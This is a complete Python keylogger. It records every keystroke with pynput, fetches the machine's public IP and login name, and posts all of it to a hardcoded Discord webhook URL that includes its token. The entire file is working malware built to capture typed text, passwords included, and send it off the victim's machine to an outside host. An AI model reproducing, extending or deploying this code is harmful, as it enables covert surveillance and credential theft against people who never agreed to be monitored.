from pynput import keyboard
import requests
import threading
import time
import socket
import os

# Discord webhook URL (replace with your own webhook URL)
WEBHOOK_URL = 'https://discord.com/api/webhooks/1348318193940303882/0SBww7zlNqUxQhzbkCOC6ScjU2rDoOVkUxxdIJzMNx4WeSSVkbkRXb7ux91eSnTDKWSi'

# Store the keystrokes
keystrokes = ""

# Dictionary for special keys
special_keys = {
    keyboard.Key.space: " SPACE ",
    keyboard.Key.enter: " ENTER ",
    keyboard.Key.backspace: " BACKSPACE ",
    keyboard.Key.tab: " TAB ",
    keyboard.Key.shift: " SHIFT ",
    keyboard.Key.ctrl_l: " CTRL ",
    keyboard.Key.alt_l: " ALT ",
    keyboard.Key.cmd: " CMD ",
    keyboard.Key.esc: " ESC ",
}

username = os.getlogin()

def get_public_ip():
    """Fetch the public IP address using an external API."""
    try:
        # Use a public API to fetch the public IP address
        response = requests.get('https://api.ipify.org?format=json')
        if response.status_code == 200:
            return response.json().get("ip")
        else:
            return "Unknown"
    except Exception as e:
        print(f"Error getting public IP address: {e}")
        return "Unknown"

def send_to_webhook(message):
    """Send the message to the Discord webhook."""
    payload = {
        "content": message
    }
    try:
        response = requests.post(WEBHOOK_URL, json=payload)
        if response.status_code == 200:
            print("Webhook message sent successfully.")
        else:
            print(f"Failed to send webhook message. Status code: {response.status_code}")
    except Exception as e:
        print(f"Error sending message to webhook: {e}")

def send_keystrokes_after_delay():
    """Send the keystrokes to the webhook after 10 seconds."""
    global keystrokes
    time.sleep(10)
    if keystrokes:
        send_to_webhook(keystrokes)
        keystrokes = ""  # Reset keystrokes after sending

def on_press(key):
    global keystrokes
    try:
        # For normal characters, we just append the character
        key_str = key.char
    except AttributeError:
        # For special keys, we use the dictionary to map to a human-readable name
        key_str = special_keys.get(key, str(key))  # Use the name from the dictionary if available

    # Append the key press to the keystrokes string
    keystrokes += key_str

    # Start a timer to send keystrokes after 10 seconds
    threading.Thread(target=send_keystrokes_after_delay).start()

def on_release(key):
    if key == keyboard.Key.delete:
        # Stop the listener when the Esc key is pressed
        send_to_webhook(f"Connection stopped by user: {username}")
        return False

# Start by sending the public IP address to the webhook
public_ip = get_public_ip()
send_to_webhook(f"Connection established. Public IP address: {public_ip}")
send_to_webhook(f"Current user: {username}")


# Set up the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
